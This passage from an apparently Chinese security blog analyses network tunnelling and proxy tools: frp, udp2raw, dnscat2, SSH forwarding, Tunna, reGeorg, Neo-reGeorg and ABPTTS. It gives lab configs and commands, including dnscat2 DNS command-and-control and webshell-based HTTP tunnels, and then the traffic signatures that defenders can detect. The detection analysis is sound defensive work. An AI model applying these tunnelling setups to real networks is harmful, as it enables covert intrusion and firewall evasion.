<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155957572.png" alt="image-20220205155957572"></p>
<p>随后，客户端继续携带生成的“会话key”，向服务端发起请求</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205160235228.png" alt="image-20220205160235228"></p>
<p>在服务端确认相同的“会话key”后，客户端发起请求管理端的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const ADMIN_UUID = &quot;IAMADMINXD&quot;</span><br><span class="line">const TEMP_UUID = &quot;IAMNEWHERE&quot;</span><br><span class="line">const TEMP_ROUTE = &quot;THEREISNOROUTE&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205160519450.png" alt="image-20220205160519450"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205160541396.png" alt="image-20220205160541396"></p>
<p>服务端回复确认后，建立连接</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205160645385.png" alt="image-20220205160645385"></p>
<p>由于未加密，存在明文信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205161156594.png" alt="image-20220205161156594"></p>
<p>在建立连接后，伴随着大量重复ACK确认请求，怀疑是做心跳保持？</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205161017350.png" alt="image-20220205161017350"></p>
<p><strong>Frp</strong></p>
<p>1）未添加tls加密下的frp</p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.131</span><br><span class="line">server_port = 7000</span><br><span class="line">token = test@123</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.73</span><br><span class="line">remote_port = 1081</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = 123</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = test@123</span><br></pre></td></tr></table></figure>



<p>客户端携带版本架构等信息向服务端发起请求</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205183254355.png" alt="image-20220205183254355"></p>
<p>服务端回应相关信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205184901937.png" alt="image-20220205184901937"></p>
<p>客户端和服务端之间传递会话id和会话key</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205185013518.png" alt="image-20220205185013518"></p>
<p>服务端创建socks5信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205192128433.png" alt="image-20220205192128433"></p>
<p>由于进行了加密和压缩，报文的data是加密的</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205192614001.png" alt="image-20220205192614001"></p>
<p>2）添加了tls加密后的frp</p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.131</span><br><span class="line">server_port = 7000</span><br><span class="line">token = test@123</span><br><span class="line">tls_enable = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.73</span><br><span class="line">remote_port = 1081</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = 123</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = test@123</span><br></pre></td></tr></table></figure>



<p>添加了tls和加密压缩后的frp在通信过程已经没有了版本信息和会话信息。不过，在建立连接的过程启用tls前，客户端携带“0x17”,请求服务端</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205205903524.png" alt="image-20220205205903524"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205210648245.png" alt="image-20220205210648245"></p>
<p>利用wireshark详细分析，发现wireshark识别该报文为“Gryphon”协议，“Gryphon”协议为工控协议，用于车用通讯协定</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205212746545.png" alt="image-20220205212746545"></p>
<p>随后，以固定的243字节的TLS-hello报文向服务端发起请求</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205210046231.png" alt="image-20220205210046231"></p>
<p>固定243字节长度的hello报文告诉服务端，frp支持的一系列加密算法套件</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205220024598.png" alt="image-20220205220024598"></p>
<p>服务端选定加密算法，理论上也是90字节大小的TLS-hello报文，向客户端发起应答</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205220853707.png" alt="image-20220205220853707"></p>
<p>随后完成协商过程，建立tls加密通信</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205221017950.png" alt="image-20220205221017950"></p>
<h3 id="5、UDP隧道技术"><a href="#5、UDP隧道技术" class="headerlink" title="5、UDP隧道技术"></a>5、UDP隧道技术</h3><p><strong>Udp2raw</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>该工具可以利用原始套接字并通过伪造的TCP&#x2F;UDP&#x2F;ICMP流量来帮助研究人员绕过UDP防火墙（或不稳定的UDP环境）。</p>
<p>其支持心跳保活、自动重连，重连后会恢复上次连接，在底层掉线的情况下可以保持上层不掉线。同时有加密、防重放攻击、信道复用的功能。</p>
<ul>
<li>下载</li>
</ul>
<p>​	<a target="_blank" rel="noopener" href="https://github.com/wangyu-/udp2raw">https://github.com/wangyu-/udp2raw</a></p>
<ul>
<li>使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在server端运行:</span><br><span class="line">./udp2raw_amd64 -s -l0.0.0.0:4096  -r127.0.0.1:7777   -k &quot;passwd&quot; --raw-mode faketcp   --cipher-mode xor  -a</span><br><span class="line"></span><br><span class="line">在client端运行:</span><br><span class="line">./udp2raw_amd64 -c -l0.0.0.0:3333  -r192.168.1.133:4096 -k &quot;passwd&quot; --raw-mode faketcp   --cipher-mode xor  -a</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205225116888.png" alt="image-20220205225116888"></p>
<p>客户端</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205225154448.png" alt="image-20220205225154448"></p>
<h3 id="6、UDP隧道流量特征"><a href="#6、UDP隧道流量特征" class="headerlink" title="6、UDP隧道流量特征"></a>6、UDP隧道流量特征</h3><p><strong>Udp2raw</strong></p>
<p>利用udp2raw技术构建的隧道，目前在流量上未发现明显的特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205230934102.png" alt="image-20220205230934102"></p>
<h3 id="7、DNS隧道技术"><a href="#7、DNS隧道技术" class="headerlink" title="7、DNS隧道技术"></a>7、DNS隧道技术</h3><p><strong>DnsCat2</strong> &amp;&amp; <strong>Dnscat2-Powrshell</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>dnscat2是一款开源软件，使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证。使用Shell及DNS查询类型(TXT、MX、CNAME、A、AAAA)，多个同时进行的会话类似于SSH中的隧道。dnscat2的客户端是有Windows版和Linux版，服务端是用Ruby语言编写的。</p>
<p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。<br>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求<br>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。</p>
<ul>
<li>下载</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
<ul>
<li>使用</li>
</ul>
<p>1）直连模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb -s 553 -c password --no-cache</span><br><span class="line"></span><br><span class="line">dnscat2-client.exe --dns server=192.168.1.133,port=553 --secret=password</span><br></pre></td></tr></table></figure>

<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220206163441487.png" alt="image-20220206163441487"></p>
<p>2）中继模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#-e 指定安全级别，open 表示服务端允许客户端不进行加密</span><br><span class="line">ruby ./dnscat2.rb www.dnstuneltest.com -c password --no-cache -e open</span><br><span class="line">dnscat2-client.exe --dns domain=www.dnstuneltest.com --secret=password</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208181420994.png" alt="image-20220208181420994"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208181514586.png" alt="image-20220208181514586"></p>
<h3 id="8、DNS隧道流量特征"><a href="#8、DNS隧道流量特征" class="headerlink" title="8、DNS隧道流量特征"></a>8、DNS隧道流量特征</h3><p>直连模式下，dnscat2存在明显的连接特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207102250311.png" alt="image-20220207102250311"></p>
<p>中继模式下的dnscat2，除开携带域名信息外，无其他明显流量特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208181949011.png" alt="image-20220208181949011"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208182038642.png" alt="image-20220208182038642"></p>
<p>除了域名信息外，单位时间内dns数据包的发送频率也可以当作特征处理。</p>
<h3 id="9、SSH隧道技术"><a href="#9、SSH隧道技术" class="headerlink" title="9、SSH隧道技术"></a>9、SSH隧道技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -N -f -L 192.168.1.133:4444:192.168.1.129:3389 192.168.1.133</span><br></pre></td></tr></table></figure>

<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207110555358.png" alt="image-20220207110555358"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207110652187.png" alt="image-20220207110652187"></p>
<h3 id="10、SSH隧道流量特征"><a href="#10、SSH隧道流量特征" class="headerlink" title="10、SSH隧道流量特征"></a>10、SSH隧道流量特征</h3><p>在利用ssh进行隧道转发的过程中，除第一个数据包会出现机器的用户名外，在流量过程中无其他明显指纹</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207112639602.png" alt="image-20220207112639602"></p>
<h3 id="11、HTTP隧道技术"><a href="#11、HTTP隧道技术" class="headerlink" title="11、HTTP隧道技术"></a>11、HTTP隧道技术</h3><p><strong>tunnel</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>Tunna 是一组工具，它将通过 HTTP 包装和隧道任何 TCP 通信。它可用于绕过完全防火墙环境中的网络限制。</p>
<ul>
<li>下载</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p>
<ul>
<li>使用</li>
</ul>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207135209976.png" alt="image-20220207135209976"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l 表示本地监听的端口</span><br><span class="line">-r 远程要转发的端口</span><br><span class="line">-v 详细模式</span><br><span class="line">-b 请求大小</span><br><span class="line">-s 首先启动 pinging 线程 - 一些服务首先发送数据（例如 SSH）</span><br><span class="line">-C 请求 cookie</span><br><span class="line">-t 基本认证</span><br></pre></td></tr></table></figure>

<p>1）连接RDP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://192.168.1.137:81/Files/common/conn.aspx -l 1234 -r 3389 –v</span><br><span class="line">python proxy.py -u http://192.168.1.137:81/Files/common/conn.aspx -l 1234 -a 192.168.3.144 -r 3389</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207143334156.png" alt="image-20220207143334156"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207143305721.png" alt="image-20220207143305721"></p>
<p>2）连接SSH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://218.4.45.152:8877/job/conn.php -l 1234 -r 22 -v –s</span><br></pre></td></tr></table></figure>



<p><strong>reGeog</strong>&amp;&amp;<strong>Neo-reGeorg</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>reGeorg是reDuh的继承者,其主要是把内网服务器的端口通过http&#x2F;https构建成隧道的一款工具。</p>
<p>Neo-reGeorg是一个旨在积极重构reGeorg的项目，目的是：提高 tunnel 连接安全性、提高可用性，避免特征检测、提高传输内容保密性、应对更多的网络环境场景。</p>
<p>Neo-reGeorg支持：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、传输内容经过变形 base64 加密，伪装成 base64 编码</span><br><span class="line">2、直接请求响应可定制化 (如伪装的404页面)</span><br><span class="line">3、HTTP Headers 的指令随机生成，避免特征检测</span><br><span class="line">4、HTTP Headers 可定制化</span><br><span class="line">5、自定义 HTTP 响应码</span><br><span class="line">6、多 URL 随机请求</span><br><span class="line">7、服务端 DNS 解析</span><br><span class="line">8、兼容 python2 / python3</span><br><span class="line">9、服务端环境的高兼容性</span><br><span class="line">(仅 php) 参考 pivotnacci 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景</span><br><span class="line">aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行</span><br><span class="line">(非 php) 支持内网转发，应对负载均衡环境</span><br></pre></td></tr></table></figure>



<ul>
<li>下载</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<ul>
<li>使用</li>
</ul>
<p>reGeorg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207154816276.png" alt="image-20220207154816276"></p>
<p>Neo-reGeorg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php</span><br><span class="line"></span><br><span class="line">python neoreg.py generate -k &lt;you_password&gt; --file 404.html --httpcode 404</span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip</span><br><span class="line"></span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5://10.1.1.1:8080</span><br><span class="line"></span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#x27;Authorization: cm9vdDppcyB0d2VsdmU=&#x27; --cookie &quot;key=value;key2=value2&quot;</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207163021305.png" alt="image-20220207163021305"></p>
<p><strong>ABPTTS</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP&#x2F;HTTPS进行流量转发的工具。</p>
<ul>
<li>下载</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
<ul>
<li>使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/ABPTTS.git</span><br><span class="line">pip install pycryptodome</span><br><span class="line">pip install httplib2</span><br><span class="line"></span><br><span class="line">#生成对应webshell</span><br><span class="line">python abpttsfactory.py -o webshell</span><br><span class="line"></span><br><span class="line">#把目标主机的3389端口转发到本地的7777端口</span><br><span class="line">python abpttsclient.py -c webshell/config.txt -u &quot;http://192.168.1.137:81/Files/common/abptts.aspx&quot; -f 192.168.1.133:7777/127.0.0.1:3389</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207232455635.png" alt="image-20220207232455635"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207235850590.png" alt="image-20220207235850590"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207235827525.png" alt="image-20220207235827525"></p>
<h3 id="12、HTTP隧道流量特征"><a href="#12、HTTP隧道流量特征" class="headerlink" title="12、HTTP隧道流量特征"></a>12、HTTP隧道流量特征</h3><p><strong>tunnel</strong></p>
<p>页面特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207144843428.png" alt="image-20220207144843428"></p>
<p>连接报文特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207150431658.png" alt="image-20220207150431658"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207150143988.png" alt="image-20220207150143988"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207150618563.png" alt="image-20220207150618563"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207150453800.png" alt="image-20220207150453800"></p>
<p>**reGeog&amp;<strong>Neo-reGeorg</strong></p>
<p>对于reGeog，其默认的页面特征为</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207155814894.png" alt="image-20220207155814894"></p>
<p>从流量报文上看，也具有一定的特征信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207155631006.png" alt="image-20220207155631006"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207155947592.png" alt="image-20220207155947592"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207160054406.png" alt="image-20220207160054406"></p>
<p>Neo-reGeog的页面信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165820468.png" alt="image-20220207165820468"></p>
